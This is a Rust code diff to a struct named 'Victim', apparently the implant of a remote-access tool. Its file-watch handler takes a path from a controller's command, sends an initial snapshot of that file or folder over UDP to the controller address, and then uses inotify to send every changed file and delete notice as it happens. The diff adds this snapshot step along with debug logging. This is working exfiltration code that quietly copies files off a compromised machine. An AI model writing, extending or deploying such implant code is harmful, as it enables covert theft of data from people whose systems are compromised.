@@ -561,20 +561,39 @@ impl Victim {
         cmd_addr: SocketAddr,
     ) -> io::Result<()> {
 
-        if payload.is_empty() { return Ok(()); }
+        if payload.is_empty() {
+            println!("[DEBUG] Empty payload for watch start");
+            return Ok(());
+        }
 
         let path_len = payload[0] as usize;
-        if payload.len() < 1 + path_len { return Ok(()); }
+        if payload.len() < 1 + path_len {
+            println!("[DEBUG] Payload too short");
+            return Ok(());
+        }
 
         let watch_path =
             String::from_utf8_lossy(&payload[1..1 + path_len]).to_string();
 
         let is_dir = Path::new(&watch_path).is_dir();
 
+        println!("[DEBUG] Watch requested for: {}", watch_path);
+        println!("[DEBUG] Is directory: {}", is_dir);
+
         let udp_clone = udp.try_clone()?;
         let path_clone = watch_path.clone();
 
         thread::spawn(move || {
+
+            println!("[DEBUG] Watch thread started for {}", path_clone);
+
+            println!("[DEBUG] Sending initial file snapshot");
+            let _ = Self::send_file_chunks(
+                &path_clone,
+                &udp_clone,
+                cmd_addr,
+                is_dir,
+            );
 
             let mut inotify = Inotify::init().expect("inotify init failed");
 
@@ -582,6 +601,8 @@ impl Victim {
                 | WatchMask::CREATE
                 | WatchMask::DELETE
                 | WatchMask::CLOSE_WRITE;
+
+            println!("[DEBUG] Adding inotify watch");
 
             inotify
                 .add_watch(&path_clone, mask)
@@ -595,21 +616,32 @@ impl Victim {
                     .read_events_blocking(&mut buffer)
                     .expect("read events failed");
 
+                println!("[DEBUG] Inotify event received");
+
                 for event in events {
 
-                    if let Some(name) = event.name {
+                    println!("[DEBUG] Event mask: {:?}", event.mask);
 
-                        let file_path = if is_dir {
-                            format!("{}/{}", path_clone, name.to_string_lossy())
-                        } else {
-                            path_clone.clone()
-                        };
+                    let file_path = if let Some(name) = event.name {
+                        let p = format!("{}/{}", path_clone, name.to_string_lossy());
+                        println!("[DEBUG] Event file: {}", p);
+                        p
+                    } else {
+                        println!("[DEBUG] Event for watched file: {}", path_clone);
+                        path_clone.clone()
+                    };
 
-                        if event.mask.contains(inotify::EventMask::DELETE) {
+                    if event.mask.contains(inotify::EventMask::DELETE) {
 
-                            if is_dir {
+                        println!("[DEBUG] Delete event detected");
+
+                        if is_dir {
+
+                            if let Some(name) = event.name {
 
                                 let filename = name.to_string_lossy();
+
+                                println!("[DEBUG] Sending folder delete packet for {}", filename);
 
                                 let mut payload = Vec::new();
                                 payload.push(filename.len() as u8);
@@ -627,27 +659,31 @@ impl Victim {
                                 packet.extend_from_slice(&payload);
 
                                 let _ = udp_clone.send_to(&packet, cmd_addr);
-
-                            } else {
-
-                                let header =
-                                    PacketHeader::new_file_watch(FILE_WATCH_DELETE, 0);
-
-                                let mut packet = vec![0u8; HEADER_SIZE];
-                                packet.copy_from_slice(&header.to_bytes());
-
-                                let _ = udp_clone.send_to(&packet, cmd_addr);
                             }
 
                         } else {
 
-                            let _ = Self::send_file_chunks(
-                                &file_path,
-                                &udp_clone,
-                                cmd_addr,
-                                is_dir,
-                            );
+                            println!("[DEBUG] Sending file delete packet");
+
+                            let header =
+                                PacketHeader::new_file_watch(FILE_WATCH_DELETE, 0);
+
+                            let mut packet = vec![0u8; HEADER_SIZE];
+                            packet.copy_from_slice(&header.to_bytes());
+
+                            let _ = udp_clone.send_to(&packet, cmd_addr);
                         }
+
+                    } else {
+
+                        println!("[DEBUG] Sending updated file: {}", file_path);
+
+                        let _ = Self::send_file_chunks(
+                            &file_path,
+                            &udp_clone,
+                            cmd_addr,
+                            is_dir,
+                        );
                     }
                 }
             }
@@ -655,7 +691,6 @@ impl Victim {
 
         Ok(())
     }
-
     // Add this method for file watch stop
     fn handle_file_watch_stop(&mut self, _payload: &[u8]) {
         if let Some(tx) = self.file_watch_stop_tx.take() {
